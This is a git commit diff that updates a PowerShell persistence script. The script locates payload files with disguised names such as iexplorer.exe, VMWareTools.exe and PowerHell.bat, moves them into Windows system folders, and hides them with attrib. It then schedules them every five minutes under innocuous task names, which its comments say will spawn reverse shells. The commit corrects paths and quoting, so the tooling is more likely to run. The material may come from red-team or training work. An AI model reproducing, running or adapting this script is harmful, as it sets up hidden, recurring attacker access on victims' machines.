acf57e100dd00b8fb505863877706c1b2cf54036
megatop1 <43348736+megatop1@users.noreply.github.com>
2022-01-30 02:16:18 -0500

    Update ScatterandSchedulePayloads.ps1

--- Windows/Persistence/ScatterandSchedulePayloads.ps1
+++ Windows/Persistence/ScatterandSchedulePayloads.ps1
@@ -5,62 +5,62 @@ $file = 'malware.xml'
 $searchinfolder = 'C:\'
 $malvbsLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
 # Move malware.xml
-move $malvbsLoc C:\Program Files\Common Files\System
+move $malvbsLoc "C:\Windows\System32"
 # Hide the file from windows explorer using attrib 
-attrib +h C:\Program Files\Common Files\System\malware.xml
+attrib +h "C:\Windows\System32\malware.xml"
 
 # Find iexplorerr.exe
-$file = 'iexplorerr.exe'
+$file = 'iexplorer.exe'
 $searchinfolder = 'C:\'
 $iexplorerrLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
 # Move iexplorerr.exe
-move $iexplorerrLoc = "C:\Program Files\Common Files\System"
+move $iexplorerrLoc "C:\Program Files\Common Files\System"
 # Hide the file from windows explorer using attrib
-attrib +h "C:\Program Files\Common Files\System\iexplorerr.exe"
+attrib +h "C:\Program Files\Common Files\System\iexplorer.exe"
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "Update Internet Explorer" /tr "C:\Program Files\Common Files\System\iexplorerr.exe"
+schtasks /create /sc minute /mo 5 /tn "Update Internet Explorer" /tr "C:\Program Files\Common Files\System\iexplorer.exe"
 
 # Find PowerHell.bat
 $file = 'PowerHell.bat'
 $searchinfolder = 'C:\'
 $powerhellLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
 # Move PowerHell.bat
-move $powerhellLoc "C:\Program Files (x86)\Microsoft.NET"
+move $powerhellLoc "C:\Windows\System32"
 # Hide the file from windows explorer using attrib
-attrib +h C:\Program Files (x86)\Microsoft.NET\PowerHell.bat
+attrib +h "C:\Windows\System32\PowerHell.bat"
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "C:\Program Files (x86)\Microsoft.NET\PowerHell.bat"
+schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "C:\Windows\System32\PowerHell.bat"
 
 # Find PowerManagement.exe
 $file = 'PowerManagement.exe'
 $searchinfolder = 'C:\'
 $powermanLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
 # Move PowerManagement.exe
-move $powermanLoc C:\sources\en-US
+move $powermanLoc "C:\Program Files\Mozilla Firefox"
 # Hide the file from windows explorer using attrib
-attrib +h  C:\sources\en-US\PowerManagement.exe
+attrib +h  "C:\Program Files\Mozilla Firefox\PowerManagement.exe"
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "C:\sources\en-US\PowerManagement.exe"
+schtasks /create /sc minute /mo 5 /tn "System Cleanup" /tr "C:\Program Files\Mozilla Firefox\PowerManagement.exe"
 
 # Find VMWareTools.exe
 $file = 'VMWareTools.exe'
 $searchinfolder = 'C:\'
 $vmwaretoolsLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
 # Move VMWareTools.exe
-move $vmwaretoolsLoc C:\Users\Public
+move $vmwaretoolsLoc "C:\Users\Public"
 # Hide VMWareTools.exe
-attrib +h C:\PerfLogs\VMWareTools.exe
+attrib +h "C:\Users\Public\VMWareTools.exe"
 # Schedules the persistence to spawn a reverse shell
-schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr "C:\PerfLogs\VMWaretools.exe"
+schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr "C:\Users\Public\VMWareTools.exe"
 
 # Find DiskHelper.exe
 $file = 'DiskHelper.exe'
 $searchinfolder = 'C:\'
 $diskhelperLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
 # Move DiskHelper.exe
-move $diskhelperLoc = C:\Windows\drivers
+move $diskhelperLoc = "C:\Windows\drivers"
 # Hide DiskHelper.exe
-attrib +h C:\Windows\drivers\DiskHelper.exe
+attrib +h "C:\Windows\drivers\DiskHelper.exe"
 # Schedules the persistence to spawn a reverse shell
 schtasks /create /sc minute /mo 5 /tn "VMWare Updater" /tr "C:\Windows\drivers\DiskHelper.exe"
 
@@ -69,9 +69,9 @@ $file = 'audio.exe'
 $searchinfolder = 'C:\'
 $audioLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
 # Move audio.exe
-move $audioLoc C:\Windows\DigitalLocker\en-us
+move $audioLoc "C:\Windows\DigitalLocker\en-us"
 # Hide audio.exe 
-attrib +h C:\Windows\DigitalLocker\en-us\audio.exe
+attrib +h "C:\Windows\DigitalLocker\en-us\audio.exe"
 # Schedules the persistence to spawn a reverse shell
 schtasks /create /sc minute /mo 5 /tn "audio player" /tr "C:\Windows\DigitalLocker\en-us\audio.exe"
 
@@ -80,7 +80,7 @@ $file = 'LogMGMT.exe'
 $searchinfolder = 'C:\'
 $logmgmtLoc = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
 # Move LogMGMT
-move $logmgmtLoc C:\Windows\Globalization\ELS
+move $logmgmtLoc "C:\Windows\Globalization\ELS"
 # Hide LogMGMT.exe
 attrib +h C:\Windows\Globalization\ELS\LogMGMT.exe
 # Schedules the persistence to spawn a reverse shell
